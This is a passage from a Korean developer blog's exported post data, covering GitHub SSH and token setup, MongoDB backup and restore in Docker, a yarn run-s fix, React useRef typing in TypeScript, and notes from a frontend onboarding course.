경우\n\n$ ssh-keygen -t rsa -C \"test@test.com\"\n```\n\n![](/img05.png)\n\n보안 때문에 일부 내용은 지웠지만 이해를 방해하지 않기에...  \nEnter file in which to save the key 의 경우 key 파일 이름을 정해주는데 그냥 두면 기본 값으로 들어간다.  \nEnter passphrase 는 키의 암호인데 없어도 무방하다. (하지만 보안을 위해 입력해주자)\n\n그리고 다 되면 키가 생성되는데 이름을 기본으로 둔 것으로 가정하고 설명한다.  \n아마 경로를 바꾸지 않았다면 홈 디렉토리 내의 .ssh에 들어가 있을 것이다.(기본 파일명은 **id_rsa.pub**)\n\n이 파일을 cat 등으로 내용을 확인하고 이 값을 복사해둔다.(Github에 등록해야 하기 때문에)  \n그 다음은 Github로 가서 작업을 해야 한다.\n\n<br>\n\n## 2. Github 설정\n\n깃헙가서 자기 프로필 누르고 **Settings**로 이동한다.\n\n![](/img01.png)\n\n그리고 거기서 **SSH and GPG Keys**로 간다.\n\n![](/img02.png)\n\n그리고 상단의 **New SSH Key**를 선택한다.\n\n![](/img03.png)\n\n그리고 여기에서 **Title**은 별칭? 이름? 이 등록될 키에 대한 간단한 코멘트를 적자.  \nKey Type은 그대로 두고...  \nKey에는 아까 복사한 키 값을 넣고 **Add SSH Key**버튼을 클릭한다.\n\n![](/img06.png)\n\n이렇게 등록이 되면 Github에서는 끝이다.\n\n<br>\n\n## 3. 다시 clone\n\n이제 클론을 해야 하는데, 하기 전에 아래의 명령어를 통해서 키가 정상적으로 등록이 되었는지 확인해준다.\n\n```\nssh -T git@github.com\n```\n\n근데 바로할 경우 에러가 날 때도 있다.\n\n근데 바로 하면 안될 때가 있다.\n\n![](/img07.png)\n\n잘 처리된 경우 아래와 같이 나오게 된다.\n\n![](/img08.png)\n\n<br>\n\n## 4. 계정과 비밀번호를 요구할 때는?\n\n![](/img09.png)\n\n위 사진처럼 계정 비번을 입력했는데 에러가 나는 경우가 있다.(물론 올바르게 입력했다는 가정 하에..)  \n이 경우 2단계 인증을 쓰거나 할 경우가 있는데 이때는 토큰을 받아서 처리해야 한다.\n\n![](/img10.png)\n\n다시 깃허브 가서 아까 메뉴에서 아래 보면 **Developer settings**라는 것이 있다.\n\n![](/img11.png)\n\n이렇게 뜨는데 **Fine-grained tokens**는 최신 버전이다.(그래서 베타인가...)  \n구형과 차이점은 권한과 레파지토리를 좀 유연하게 적용할 수 있다.  \n궁금하면 직접 클래식으로 해보고, 신형으로 해보면 알 수 있다.\n\n여기서는 **Fine-grained tokens** 버전으로 설명한다.\n\n![](/img12.png)\n\n<br>\n\n저기 상단의 **Generate new token**버튼을 클릭한다.\n\n![](/img13.png)\n\n어지러운 입력창이 뜨는데 별거 아니고...  \n저기 **Repository access** 부분은 이 토큰의 권한을 적용할 레포지토리를 선택하는 곳이다.  \n나의 경우 프라이빗 레포 몇 개 선택을 했다.\n\n그리고 **Permissions**항목에서 **Account Permissions**는 계정에 대한 것인데 나는 하나의 계정이라 굳이 설정을 건들지 않았다.  \n내가 건든건 **Repository permissions**인데 나는 **Administration**과 **Metadata**에 **Read and Write**권한을 줬다.\n\n생성을 하면 아마 화면에 키를 알려줄 건데 이 키를 잘 보관해두자.  \n이 키가 암호가 된다.\n\n다시 계정 비번에서 위 암호를 넣고 실행하면 잘 될 것이다.  \n안된다면 본인이 오타를 쳤을 확률이 높다...\n\n그리고 계속 암호를 물어보면 귀찮으니...\n\n```\ngit config --global credential.helper store\n```\n\n이 명령어를 주면 인증 정보를 스토어에 저장해서 더 이상 묻지 않게 된다.\n\n```toc\n\n```\n"},{"excerpt":"슬슬 데이터를 이동해볼까... 기존 개발 서버에서 쓰던 디비를 몇 가지 옮겨서 쓸 일이 있어서 찾아보다가... 또 잊을까봐 정리해두려고 쓰는 포스팅.. 구성은 Aws Ubuntu의 Docker 환경에서 진행하였다. MongoDb Backup 일단 Docker 안의 MongoDB에 접근해야 한다. 접근 명령어는 아래와 같이... 저 뒤의 mongo는 doc…","fields":{"slug":"/mongodb/230118_mongo_dump/"},"frontmatter":{"date":"January 18, 2023","title":"MongoDB 백업(Backup) & 복원(Restore) (With Docker)","description":null,"tags":["MongoDB"],"series":"MongoDB","previewImage":"mongo_logo.png","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.png)\n\n# 슬슬 데이터를 이동해볼까...\n\n기존 개발 서버에서 쓰던 디비를 몇 가지 옮겨서 쓸 일이 있어서 찾아보다가...  \n또 잊을까봐 정리해두려고 쓰는 포스팅..\n\n구성은 Aws Ubuntu의 Docker 환경에서 진행하였다.\n\n<br>\n\n## MongoDb Backup\n\n일단 Docker 안의 MongoDB에 접근해야 한다.  \n접근 명령어는 아래와 같이...  \n저 뒤의 **mongo**는 docker 컨테이너 이름인데 각자 알맞게 적어준다.\n\n```\n$ sudo docker exec --it mongo /bin/bash\n```\n\nShell에 접근 후 전체 디비를 뜨는 경우 옵션을 안줘도 되지만,  \n나는 특정 디비만 백업하면 되는 것이라서 아래와 같이 명령어를 수행했다.\n\n그리고 **out**뒤의 인자는 덤프를 뜬 뒤의 디렉토리를 정해주는건데 Shell 내부 디렉토리를 가리킨다.\n\n```\n# mongodump --out /backup/ --db mydb\n```\n\n만약 디비가 없는 경우 아래와 같이 에러가 나므로 주의\n\n```\n# mongodump --out /backup/ --db mydb\n2023-01-18T11:49:23.716+0900\tFailed: error creating intents to dump: error getting collections for database `mydb`: (Unauthorized) command listCollections requires authentication\n```\n\n<br>\n\n내 디비의 경우 계정 비밀번호가 있었는데 이 경우 아래와 같이 옵션을 주면 된다.\n\n```\n -u : 디비 접근 가능 id\n -p : 계정 암호\n --db : 대상 디비\n```\n\n정상적으로 덤프를 따면 아래와 같이 덤프가 생성되고 담기게 된다.\n\n```\n# mongodump --out /backup/ -u mydbuser -p 12345 --db mydb\n2023-01-18T02:56:20.823+0000\twriting mydb.a_data to /backup/mydb/a_data.bson\n2023-01-18T02:56:20.828+0000\twriting mydb.a_data to /backup/mydb/a_data.bson\n2023-01-18T02:56:20.829+0000\twriting mydb.a_data to /backup/mydb/a_data.bson\n2023-01-18T02:56:20.837+0000\tdone dumping mydb.a_data (0 documents)\n2023-01-18T02:56:20.839+0000\tdone dumping mydb.a_data (153 documents)\n2023-01-18T02:56:20.842+0000\tdone dumping mydb.a_data (0 documents)\n2023-01-18T02:56:20.852+0000\twriting mydb.a_data to /backup/mydb/a_data.bson\n2023-01-18T02:56:21.042+0000\tdone dumping mydb.a_data (1051 documents)\n```\n\n이렇게 하면 백업 데이터가 **backup** 디렉토리에 저장이 된다.  \n이것을 이제 밖으로 빼려면 아래와 같이 수행한다.  \n실행은 shell 밖에서 해준다.\n\n```\n# sudo docker cp [docker 내 컨테이너 이름]:[아까 백업 담겼던 디렉토리] [저장할 디렉토리]\n\n$ sudo docker cp mongo:/backup/ ./my_backup\n```\n\n<br>\n\n## MongoDb Resotre\n\n위에서는 백업을 했으니 이제는 다시 복원시킬 차례다.  \n옮길 곳이 나는 로컬에서 Aws에서 도는 ubuntu였다.\n\n백업 디렉토리는 파일질라 등으로 옮겨주고...\n\n이제 대상지도 같은 환경이라 가정하고...  \n대상 도커 컨테이너 내에 넣어준다.\n\n```\n# sudo docker cp [현재 백업파일이 있는 디렉토리] [docker 내 컨테이너 이름]:[docker 내 저장할 디렉토리]\n\n$ sudo docker cp ./my_backup mongo:/backup\n```\n\n그리고 MongoDB에 접속해 준다.\n\n```\nsudo docker exec -it mongo /bin/bash\n```\n\n그리고 해당 백업 디렉토리가 존재하는지 확인 후 아래의 명령어대로 리스토어를 실행한다.\n\n```\n# mongorestore -u tester -p 12345 --db mydb ./backup\n2023-01-18T12:05:40.287+0900\tThe --db and --collection flags are deprecated for this use-case; please use --nsInclude instead, i.e. with --nsInclude=${DATABASE}.${COLLECTION}\n2023-01-18T12:05:40.292+0900\tbuilding a list of collections to restore from backup dir\n2023-01-18T12:05:40.293+0900\treading metadata for mydb.a.data from backup/data.metadata.json\n.....\n2023-01-18T12:05:40.490+0900\t1204 document(s) restored successfully. 0 document(s) failed to restore.\n#\n```\n\n이렇게 하면 백업 & 복원이 간단하게 끝났다.\n\n### 기타\n\n이거를 직접 통신으로 하는 방법도 있던 것 같은데...  \n일단 할 일이 많기 때문이 이런 노가다 방법으로 처리했다.\n\n향후 시간이 될때 더 고차원적인 방법을 찾아봐야겠다.\n"},{"excerpt":"배포를 하려다가... 흑집소 서비스를 더 개발해서 오픈하려 했지만... 일단 홍보 전 몇가지 기능만 오픈해서 데이터를 모아보자는 생각에 배포를 준비하게 되었다. 로컬 환경을 떠나서 EC2의 서비스 환경을 구성하던 도중, 전에 개발했던 MyMeLink의 기록을 찾아서 적용하기 시작했다. package.json의 script 부분도 알맞게 변경 후 아래와 같…","fields":{"slug":"/node-js/230118_yarn_runs_not_excute/"},"frontmatter":{"date":"January 18, 2023","title":"yarn에서 run-s 실행이 안될 때 (With package.json)","description":null,"tags":["NodeJS","Yarn"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n![](/thumbnail.png)\n\n# 배포를 하려다가...\n\n흑집소 서비스를 더 개발해서 오픈하려 했지만...  \n일단 홍보 전 몇가지 기능만 오픈해서 데이터를 모아보자는 생각에 배포를 준비하게 되었다.\n\n로컬 환경을 떠나서 EC2의 서비스 환경을 구성하던 도중,  \n전에 개발했던 [MyMeLink](https://myme.link)의 기록을 찾아서 적용하기 시작했다.\n\n**package.json**의 **script** 부분도 알맞게 변경 후 아래와 같이 구성되어 있었다.\n\n```json\n{\n  \"build:prod\": \"some build\",\n  \"pm2_start:prod\": \"some start\",\n  \"run:prod_init\": \"run-s build:prod pm2_start:prod\"\n}\n```\n\n위의 내용 중 실행 쪽은 가려둔 상태이다.  \n근데 실행을 하니... 아래와 같은 에러가 발생하였다.\n\n```\n$ yarn run run:prod_init\nyarn run v1.22.19\n$ run-s build:prod pm2_start:prod\n/bin/sh: 1: run-s: not found\nerror Command failed with exit code 127.\ninfo Visit https://yarnpkg.com/en/docs/cli/run for documentation about this command.\n```\n\n## 뭐가 문제일까?\n\n위 에러를 보면 알겠지만 **run-s**라는 것을 못찾아서 그렇다.  \n근데 따로 뭔가 설치하진 않았던것 같은데...\n\n그래서 웹에서 찾아보니...  \n내가 설치를 안한게 있었다...  \n이상한데...package.json 비교해봤지만 저거는 따로 안깔았었다.\n\n무튼 아래 패키지를 설치하니 잘 되었다.\n\n```\nyarn add npm-run-all --dev\n```\n\n여담인데 스택오버플에서 아래와 같이...\n\n![](/img01.png)\n\n왜 비추 5개가 박혀있는 것인가...  \n정황은 잘 모르겠지만, 그 정도로 우매했던 질문인 것인가 라는 생각이 들고...\n\n무튼 또 내가 같은 실수를 반복할까봐 포스팅으로 남겨둔다...\n\n## 참고\n\n[참고한 stackoverflow](https://github.com/0xProject/0x-starter-project/issues/10)\n\n```toc\n\n```\n"},{"excerpt":"개인적인 스터디를 하다가... Typescript에서 useRef에 대한 사용법을 조사하다... 좀 딥하게(?) 약간은 좀 알아보고자 찾고 학습한 내용을 포스팅으로 정리해봤다. 역시 매번 느끼는데 웹 문서 스크롤로 몇번 내리고 예제 몇번 해보면 되는데, 이걸 문서화 하는건 역시 시간이 든다. 하지만 이렇게 함으로써 머리속에서 정리가 되고 내 경험치가 쌓이…","fields":{"slug":"/react/230115_useref/"},"frontmatter":{"date":"January 15, 2023","title":"React useRef에 대하여","description":null,"tags":["ReactJS"],"series":"ReactJS","previewImage":"react_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_react.png)\n\n# 개인적인 스터디를 하다가...\n\nTypescript에서 useRef에 대한 사용법을 조사하다...  \n좀 딥하게(?) 약간은 좀 알아보고자 찾고 학습한 내용을 포스팅으로 정리해봤다.\n\n역시 매번 느끼는데 웹 문서 스크롤로 몇번 내리고 예제 몇번 해보면 되는데,  \n이걸 문서화 하는건 역시 시간이 든다.  \n하지만 이렇게 함으로써 머리속에서 정리가 되고 내 경험치가 쌓이겠지... 라는 위안으로 포스팅을 시작해본다.\n\n## UseRef?\n\n뭐 알다시피 React Hook의 일종이다.  \n함수의 형태는 다음과 같이 생겼다.\n\n```typescript\nfunction useRef<T>(initialValue: T): MutableRefObject<T> //1\nfunction useRef<T>(initialValue: T | null): RefObject<T> //2\nfunction useRef<T = undefined>(): MutableRefObject<T | undefined> //3\n```\n\n저것에 대해서는 차차 알아보고 저렇게 생겼다는 것을 알아두자.  \n.current 프로퍼티로 전달된 인자(**initialValue**)로 초기화된 변경 가능한 ref 객체를 반환한다.\n\n말이 뭔가 어려운데 쉽게 **DOM** 객체를 조작하거나, 컴토넌트의 특정 부분을 선택할 수 있는 방법을 제시하는 Hook이다.  \n그래서 간단한 사용 예시는...  \n코드를 보자\n\n```typescript\nexport default function SomeComponent() {\n  const inputRef = useRef<HTMLInputElement>(null)\n\n  return (\n    <>\n      <div className=\"App\">\n        <div>Hi</div>\n        <input placeholder=\"hello\" ref={inputRef} />\n        <button onClick={() => console.log(\"a = \", inputRef.current?.value)}>\n          Check\n        </button>\n      </div>\n    </>\n  )\n}\n```\n\n예제 코드가 좀 엉망이지만 input에 값을 입력하고 버튼을 클릭하면,  \n콘솔에 input의 입력 값이 나오게 된다.\n\n여기서도 한 가지 중요 포인트는 이 **.current**로 변경시킬 때 **리랜더링을 발생시키지 않는다** 라는 점을 유의해야 한다.  \n그래서 어떤 가변적인 값을 유지하기에 좋다.  \n공홈에도 이렇게 명시되어 있다.\n\n> 본질적으로 useRef는 .current 프로퍼티에 변경 가능한 값을 담고 있는 “상자”와 같습니다.\n\n무튼 돌아와서...  \n위의 선언된 useRef를 보면 반환 값이 **MutableRefObject**와 **RefObject** 이렇게 두 가지로 되어 있다.\n\n먼저 답을 이야기 하면...\n\n**MutableRefObject**는 로컬 변수 용도로... 즉 값 형태로 사용할 때 쓰는 타입이고,  \n**RefObject**는 DOM 객체를 담을 때 쓰는 타입이다.\n\n자세한 것은 각각 타입을 설명하면서 다루겠다.\n\n<br>\n\n### MutableRefObject\n\n이름만 봐도 알 수 있다.  \n변형적인 Ref 객체...(너무 원시적인가 -\\_-;;)\n\n무튼 변수와 같은 값을 담는 참조 객체라는 것이다.  \n간단한 코드를 보자.\n\n```typescript\nexport default function SomeCom() {\n  const ageRef = useRef<number>(0)\n\n  const click4Event = () => {\n    ageRef.current += 1\n    console.log(\"ageRef.current = \", ageRef.current)\n  }\n\n  return (\n    <>\n      <button onClick={click4Event}>한살 Plus~</button>\n    </>\n  )\n}\n```\n\n위 코드를 실행하면 콘솔에 ageRef.current가 +1하는 모습을 볼 수 있을 것이다.  \n그리고 랜더링이 일어나지 않는 부분도 확인 가능할 것이다.\n\n위에서 선언된 세 가지 중 1번 항목이 여기와 같다.\n\n> function useRef<T>(initialValue: T): MutableRefObject<T> //1\n\n근데 여기서 무지성으로 ageRef에 숫자 0대신 null을 넣어보자.  \n에러가 날 것이다.\n\n왜 에러가 나냐 하면 선언된 형태 중 1번이 아닌 **2번**을 사용하기 때문이다.\n이유는 아래로 내려가자\n\n<br>\n\n### RefObject\n\n설명에 앞서 아래의 선언을 보자.\n\n> function useRef<T>(initialValue: T | null): RefObject<T> //2\n\n잘 보면 전달인자에 제너릭으로 된 초기화 외에 또 올 수 있는 값은 **null**이라고 명시되어 있다.  \n이를 보면 위 **MutableRefObject**예제에서 null을 주입했다면 **RefObject**를 반환하는 선언으로 변경된 것을 확인할 수 있다.\n\n**RefObject** 타입은 DOM 유형을 담을 때 사용한다.  \n근데 읽기 전용인거 같은데, input 같은거를 ref로 가져와서 수정해보면 또 된다.\n\n이거는 **current** 하위 속성의 value는 프로퍼티 플래그가 얇은 복사(Shallow)를 하기 때문이다.  \n그래서 current 프로퍼티 자체를 수정하려 하면 에러가 나지만, current는 에러가 나지 않는다.\n\n<br>\n\n### 기타 사항 및 알아둘 점\n\nuseRef는 항상 didMount가 되어 DOM에 반영이 된 후에 사용하자.  \n당연한 이야기겠지만 DOM을 참조해야 하는데 DOM이 mount 되기 전이면 당연 값은 null이나 undefined 일 것이다.  \n그래서 **useEffect**에서 사용하는 것이 좋다.\n\n그리고 조건 랜더링이나 컴포넌트가 unmount 되는 상황이 올 수 있기에 항상 체크를 하고 사용하는 것이 좋다.  \nif문 등으로 **textInputRef.current** 를 검사하고 사용하면 좋다.\n\n## 참조\n\n[React 공식 참조 문서(useRef)](https://ko.reactjs.org/docs/hooks-reference.html#useref)\n\n```toc\n\n```\n"},{"excerpt":"노마드코더에서 몇 가지 학습을 하다가... 요새 기본기 부족을 느껴서 다시 React의 기본부터 한번 쭉 훝기로 하였다. 그러던 중 노마드코더 강의에서 hook 쪽을 듣는데 여기는 다 JS로 코드가 구성되어 있었다. Typescript로 진행하는 나로써는 이 부분을 각 타입에 맞게끔 처리하면서 진행을 했다. 그 중 useRef 부분에서 약간 문제가 있어서…","fields":{"slug":"/react/230114_typescript_useref/"},"frontmatter":{"date":"January 14, 2023","title":"Typescript에서 useRef 사용하기 (With React)","description":null,"tags":["ReactJS","Typescript"],"series":"ReactJS","previewImage":"react_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_react.png)\n\n# 노마드코더에서 몇 가지 학습을 하다가...\n\n요새 기본기 부족을 느껴서 다시 React의 기본부터 한번 쭉 훝기로 하였다.  \n그러던 중 노마드코더 강의에서 hook 쪽을 듣는데 여기는 다 JS로 코드가 구성되어 있었다.\n\nTypescript로 진행하는 나로써는 이 부분을 각 타입에 맞게끔 처리하면서 진행을 했다.  \n그 중 **useRef** 부분에서 약간 문제가 있어서 이 부분을 조사하며 알아간 내용을 정리하려 한다.\n\n<br>\n\n## UseRef를 그래서?\n\n음 여기 포스팅에서 **UseRef**를 직접적으로 다루진 않겠다.  \n이 부분은 따로 포스팅을 하고, 이번엔 어떤 식으로 쓰는지 알아보도록 한다.\n\n먼저 타입을 정의 하기 전 **useRef**의 용도에 맞게 타입을 정의해준다.  \n아래 두 가지 형식을 확인하자.\n\n### 값(Value)\n\n제너릭과 초기값을 정해줘야 한다.\n\n```typescript\nconst name = useRef<string>(\"\")\nconst age = useRef<number>(0)\n```\n\n### DOM 객체\n\n제너릭은 참조하는 HTML 타입을 넣어주고, 초기값은 null을 넣어준다.  \n왜 null을 넣어야 하면, **useRef**로 얻는 DOM은 처음으로 마운트 되기 전까진 null이다.\n\n```typescript\nconst input4Name = useRef<HtmlInputElement>(null)\n```\n\n만약 null로 초기 값을 설정하지 않는 경우 아래와 같은 에러가 발생하게 된다.\n\n![](/img01.png)\n\n<br>\n\n내용이 이렇게 되어 있는데..(혹시 긁기 필요하신 분이 있을까봐 텍스트 버전)\n\n```\n'MutableRefObject<HTMLInputElement | undefined>' 형식은 'LegacyRef<HTMLInputElement> | undefined' 형식에 할당할 수 없습니다.\n'MutableRefObject<HTMLInputElement | undefined>' 형식은 'RefObject<HTMLInputElement>' 형식에 할당할 수 없습니다.\n'current' 속성의 형식이 호환되지 않습니다.\n'HTMLInputElement | undefined' 형식은 'HTMLInputElement | null' 형식에 할당할 수 없습니다.\n'undefined' 형식은 'HTMLInputElement | null' 형식에 할당할 수 없습니다.ts(2322)\n```\n\n근데 저렇게 에러가 나는 이유는 **MutableRefObject**의 제너릭을 보면 **HTMLInputElement | undefined**으로 되어 있다.  \n저 **useRef**의 전달인자를 확인해보면 아래와 같이 되어 있다.(사실 이렇게 이야기 하는것도 너무 오바지만...)\n\n```typescript\n/**\n * `useRef` returns a mutable ref object whose `.current` property is initialized to the passed argument\n * (`initialValue`). The returned object will persist for the full lifetime of the component.\n *\n * Note that `useRef()` is useful for more than the `ref` attribute. It’s handy for keeping any mutable\n * value around similar to how you’d use instance fields in classes.\n *\n * @version 16.8.0\n * @see https://reactjs.org/docs/hooks-reference.html#useref\n */\nfunction useRef<T>(initialValue: T): MutableRefObject<T>\n// convenience overload for refs given as a ref prop as they typically start with a null value\n/**\n * `useRef` returns a mutable ref object whose `.current` property is initialized to the passed argument\n * (`initialValue`). The returned object will persist for the full lifetime of the component.\n *\n * Note that `useRef()` is useful for more than the `ref` attribute. It’s handy for keeping any mutable\n * value around similar to how you’d use instance fields in classes.\n *\n * Usage note: if you need the result of useRef to be directly mutable, include `| null` in the type\n * of the generic argument.\n *\n * @version 16.8.0\n * @see https://reactjs.org/docs/hooks-reference.html#useref\n */\nfunction useRef<T>(initialValue: T | null): RefObject<T>\n// convenience overload for potentially undefined initialValue / call with 0 arguments\n// has a default to stop it from defaulting to {} instead\n/**\n * `useRef` returns a mutable ref object whose `.current` property is initialized to the passed argument\n * (`initialValue`). The returned object will persist for the full lifetime of the component.\n *\n * Note that `useRef()` is useful for more than the `ref` attribute. It’s handy for keeping any mutable\n * value around similar to how you’d use instance fields in classes.\n *\n * @version 16.8.0\n * @see https://reactjs.org/docs/hooks-reference.html#useref\n */\nfunction useRef<T = undefined>(): MutableRefObject<T | undefined>\n```\n\n전달인자를 제공해야 하기에 그렇다 -\\_-;;  \n근데 여기서 주목해야 하는 부분은 저 useRef의 반환이 두 가지 형태이다.\n\n여기서 더 깊게 나가면 **useRef**라는 것에 대해 깊게 봐야 하는데,  \n이해 대해 [useRef 포스팅](https://elfinlas.github.io/react/230115_useref/) 에서 다루고 있다.\n\n<br>\n\n## 뭔가 너무 간단한거 같은데?\n\n물론 그렇다...  \n단순하게 제너릭에 타입만 정의하면 되는 것이기 때문에...\n\n근데 이것도 위에서 언급한 [useRef 포스팅](https://elfinlas.github.io/react/230115_useref/) 여기를 참조하면 이 부분에 대해 이해가 더 잘 될것이다.  \n무튼 이번 포스팅을 정리하면서 또 한번 배우게 되었다.\n\n```toc\n\n```\n"},{"excerpt":"정신없이 지나간... 첫날은 1시간 차이로 백엔드 프론트엔드 둘다 겹쳐 있었다. 어우... 강의 2개를 동시에 틀어두니 정신없었다. 그나마 다행인 것은 프론트엔드가 아이스브레이킹이 좀 길었고, 취업과 관련된 썰로 시간을 좀 벌었다. 강사님도 대단하신 분이고, 강의가 너무 열정적이어서 11시에 끝났어야 하는데 오버 타임이 되었다. (11시 40분 넘었었나.…","fields":{"slug":"/til/230113_wanted_preon_front01/"},"frontmatter":{"date":"January 13, 2023","title":"23년 1월 원티드 프리온보딩 프론트엔드 1일차 TIL (Wanted Pre Onboarding FrontEnd)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/img01.png)\n\n# 정신없이 지나간...\n\n첫날은 1시간 차이로 백엔드 프론트엔드 둘다 겹쳐 있었다.  \n어우...\n\n강의 2개를 동시에 틀어두니 정신없었다.  \n그나마 다행인 것은 프론트엔드가 아이스브레이킹이 좀 길었고, 취업과 관련된 썰로 시간을 좀 벌었다.\n\n강사님도 대단하신 분이고, 강의가 너무 열정적이어서 11시에 끝났어야 하는데 오버 타임이 되었다. (11시 40분 넘었었나..)\n난 끝까지 들었다 ㅎㅎ\n\n첫 날이라 큰 내용은 없었고, 그냥 느낀점만 많았다.\n\n강의 진행은 아래와 같았다.\n\n![](/img02.png)\n\n각 챕터별로 느낀점 그리고 배운 점 등을 정리해보겠다.\n\n노션은 공개된 자료인 줄 알았으나... 확실치 않아서 이 부분은 다시 감춤 처리로 바꿨다.\n\n<font color=\"red\">그냥 들으면서 학습한 내용 및 개인 생각을 정리한 노트고, 기술적인 부분은 향후 다룰 예정이다.</font>\n\n<br>\n\n## 1-1 챌린저 메이커 / 코스 커리큘럼 소개\n\n여기는 그냥 오버뷰 시간  \n입장 인원이 초기 590명까지 들어와서 놀랐다.  \n두 가지 의미로 놀랐다.\n\n첫 번째로 이렇게 프론트엔드 영역에 대한 인기가 높은 줄은 몰랐다는 점이 컸고...  \n두 번째는 Zoom이 500명 넘는 인원도 버티는 구나...라는 부분?\n\n영상 송출쪽은 아직 한번도 안해봐서 신기했다.\n\n이번 파트는 어떤 것을 다루고 어떤 방식으로 진행하는지를 다루게 되었다.\n\n<br>\n\n## 1-2 취업 프로세스에서 기술 과제가 갖는 의미 이해하기\n\n주로 면접 질문 및 과제에 대한 자세에 대해 다뤘다.  \n과제에서 너무 화려한 코드는 오히려 감점.\n\n좀 와닿은 부분은 면접관의 질문을 모두 답한 사람은 오히려 불안해 할 수 있다 라는 대목이었다.  \n이건 생각도 못한 부분인데 이렇게 다 답변하면 **내가 오히려 검증을 충분히 못한 것인가 라는 불안함** 이 생긴다는 부분을 다시 생각해보게 되었다.\n\n여긴 정리하면 **각 회사의 포지션과 요구하는 인재상이 되도록 노력 또는 준비하자** 로 될 것 같다.\n\n<br>\n\n## 1-3 ToDo 앱을 만들며 고려할 것들\n\n여기서부터는 슬슬 기술적인 부분이 조금씩 나오기 시작했다.\n\n참고로 온보딩 전에 [사전과제](https://github.com/starkoora/wanted-pre-onboarding-challenge-fe-1-api#updateTodo)가 나갔고,  \n이에 대해 나는 한 2일? 3일? 정도 투자해서 냉큼 [결과물](https://github.com/elfinlas/wanted-pre-onboarding-challenge-fe-1)을 제출할 수 있었다.  \n물론 시간이 더 있었으면 좋겠지만... 이걸 내가 본게 마감 몇일 전이었다는게 함정...\n\n이 ToDo 프로젝트는 난이도가 상이하다.  \n간단히 구현하면 엄청 쉬운데, 조건을 몇개 붙이기 시작하면 점점 상승하기 시작한다. (물론 주니어급 이상이거나 경험이 많으면 쉬울수도...)\n\n웹 서비스를 극단적으로 보면 CRUD(Create, Read, Update, Delete)가 전부이지만, 여기에 조건을 붙인 것을,  \n최선의 방법을 잘 구현하는 것이 목표다 라고 할 수 있겠다.\n\n<br>\n\n### 상태 관리\n\n상태 관리를 설명하는 부분에서는 내가 모르는 부분이 나와서 좀 자세하게 들었다.  \n리랜더링 이슈의 경우 **MyMeLink**를 개발하며 어느정도 경험을 해서 와닿았다.\n\n그리고... **제어 컴포넌트(state)**와 **비제어 컴포넌트(ref)**에 대해 언급이 나왔는데  \n부끄럽게도 아직 리엑트쪽의 이론적인 부분에 대해서는 학습량이 부족하다.\n\n그래서 이 부분은 따로 학습해서 포스팅하여 정리할 예정이다.\n\n<br>\n\n### 비동기, 캐싱\n\n여기는 Promise 관련인데 사실 아주 예전에 조금 찾다가 그냥 **async** **await**만 주리장창 쓰는 현재로써...  \n좀 반성하게 되었다.\n\n캐시는 Next.js에서 몇번 보긴 했는데 일단 이 부분도 학습이 필요하다고 생각이 들었다...\n\n<br>\n\n### 인증과 인가\n\n여기는 충분히 알고 있다.  \n근데 예시가...(ㅋㅋㅋㅋ 진짜 김문수 도지사 사건은 생각만 하면 죽창을...)\n\n최근 **MyMeLink**와 **흑우집합소**를 진행하고 있는 시점에서 **JWT**와 계정에 따른 권한 등으로 어느정도 학습을 한 상태라서 이 부분은 넘어갔다.  \n그리고 **AOP(Aspect Oriented Programming)** 개념도 살짝 나왔다.\n\n**React-Query**에 대해서도 언급이 있었는데 이 부분은 깊게 다루진 않았다.\n\n<br>\n\n### 사용자 액션에 따른 적절한 피드백 (UI/UX)\n\n여긴 요새 서비스를 직접 만드는 입장으로 가장 중요한 부분인듯 하다.  \n아무래도 UX와 많은 연관성을 가지는 부분인데 큰 비중을 두진 않았다.\n\n<br>\n\n### 관심사의 분리\n\n**AOP(Aspect Oriented Programming)** 영역이 살짝 보이기 시작한다.\n\n구석기 프론트엔드 (퍼블리셔쪽과 같이 뭉텅이 쳐서 할 시절)에서는 진짜 그냥 화면 내 그림만 그리고, **jQuery**떡칠로 서비스를 구현하던 시절...  \n당시에는 이런 개념이 없었지만...\n\n이제는 프론트엔드에서도 사용자 화면단과, 각 컴포넌트에 대한 상태관리, 그리고 서버 측 데이터 받아서 처리 등...  \n이제 거의 백엔드와 유사(물론 결이 정말 다르다. 그냥 표현만 그렇다라는 점)한 것 같다.\n\n내 프로젝트도 현재 똥이 되어 가는데 이걸 다시 다 뜯을 생각을 하니...  \n예시에서 나온 [HeadlessUI](https://headlessui.com/react/menu)는 좀 신박한 것 같다.\n\nView 영역과 비즈니스 로직의 분리는 백엔드 영역에서는 어느정도 했지만,  \n프론트 쪽은 아직 경험이 낮아서 이 부분은 공부를 좀 많이 해봐야 할 것 같다.\n\n특히 아래 코드를 보면서 많은 학습이 필요하다는 생각이 들었다.\n\n```typescript\n// 적용 전 - 무조건 localLogin을 변경해야 함\nclass UserService {\n  async localLogin(email: string, password: string) {\n    const user = await mysql.query(`SELECT * FROM user WHERE email = ?`, [\n      email,\n    ])\n    if (jwt.compare(password, user.password)) {\n      throw new Error(\"login fail\")\n    }\n\n    return jwt.create(user.uuid)\n  }\n}\n```\n\n여기 코드를 보면 문제가 있다는 수준은 된다.  \n그런데 이것을 개선한 쪽에서...\n\n```typescript\n// 적용 후 - DB, token의 세부 구현을 어떤 것을 쓰더라도 자유로움 -> 추상에 의존\n// 추상\nclass UserService {\n  constructor(\n    private userRepository: UserRepository,\n    private tokenService: TokenService\n  ) {}\n\n  async localLogin(email: string, password: string) {\n    const user = await userRepository.getUserByEmail(email)\n\n    if (!tokenService.compare(password, user.password)) {\n      throw new Error(\"login fail\")\n    }\n\n    return tokenService.create(user.uuid)\n  }\n}\n\n// 추상\ninterface UserRepository {\n  getUserByEmail(email: string): Promise<User>\n}\n\n// 추상으로부터 구체를 구현\nclass MysqlUserAdaptor implements UserRepository {\n  getUserByEmail(email: string) {\n    return mysql.query(`SELECT * FROM user WHERE email = ?`, [email])\n  }\n}\n\n// 추상\ninterface TokenService {\n  compare(value: string, encrypted: string): Boolean\n  create(value: string): Token\n}\n\n// 추상으로부터 구체를 구현\nclass JWTokenAdaptor implements TokenService {\n  compare(value, encrypted) {\n    return jwt.compare(value, encrypted)\n  }\n\n  create(value) {\n    return jwt.create(value)\n  }\n}\n```\n\n요기 코드에서 인터페이스를 다루는 부분이 나에게 필요한 것 